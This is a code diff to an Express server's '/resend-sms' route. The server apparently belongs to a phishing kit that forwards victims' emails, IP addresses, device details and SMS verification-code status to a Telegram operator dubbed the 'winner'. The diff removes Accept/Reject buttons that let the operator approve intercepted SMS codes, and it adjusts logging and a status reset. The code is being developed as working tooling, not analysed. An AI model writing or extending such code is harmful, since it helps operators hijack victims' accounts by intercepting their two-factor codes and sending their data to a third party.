@@ -737,15 +737,7 @@ app.post("/resend-sms", async (req, res) => {
       return res.status(400).json({ error: "Missing email" });
     }
 
-    console.log(`📲 Resending SMS code to ${email}`);
-
-    // Get SMS details from pendingSMS
-    const smsSMS = pendingSMS[email];
-    if (!smsSMS) {
-      return res.status(400).json({ error: "No SMS found for this email" });
-    }
-
-    const smsCode = smsSMS.smsCode;
+    console.log(`📲 Resending SMS to ${email}`);
 
     const ip = getIP(req);
     const userAgent = req.get("user-agent") || "Unknown";
@@ -760,30 +752,25 @@ app.post("/resend-sms", async (req, res) => {
       `<b>💻 Device:</b> ${device}\n` +
       `<b>📍 IP:</b> ${ip}`;
 
-    // ✅ SEND TO WINNER ONLY
+    // ✅ SEND TO WINNER ONLY - NO BUTTONS
     if (email && userWinnerTelegram[email]) {
       console.log(`📨 Resend SMS going to winner only: ${userWinnerTelegram[email]}`);
       await sendFollowUpMessage(email, message, {
-        parse_mode: "HTML",
-        reply_markup: {
-          inline_keyboard: [
-            [
-              { text: "✅ Accept", callback_data: `sms_accept|${email}` },
-              { text: "❌ Reject", callback_data: `sms_reject|${email}` }
-            ]
-          ]
-        }
+        parse_mode: "HTML"
+        // ✅ NO reply_markup - no buttons!
       });
+      console.log(`✅ Resend SMS sent successfully to ${userWinnerTelegram[email]}`);
     } else {
-      console.log(`⚠️ No winner found for ${email}, not resending SMS`);
+      console.log(`⚠️ No winner found for ${email}, cannot resend SMS`);
       return res.status(400).json({ error: "No winner determined for this email" });
     }
 
-    // Reset SMS status to pending
-    pendingSMS[email].status = "pending";
+    // Reset SMS status to pending so polling works again
+    if (pendingSMS[email]) {
+      pendingSMS[email].status = "pending";
+      console.log(`📧 ${email} | SMS status reset to pending`);
+    }
 
-    console.log(`📧 ${email} | SMS Resent: ${smsCode}`);
-    
     res.json({ ok: true });
 
   } catch (err) {
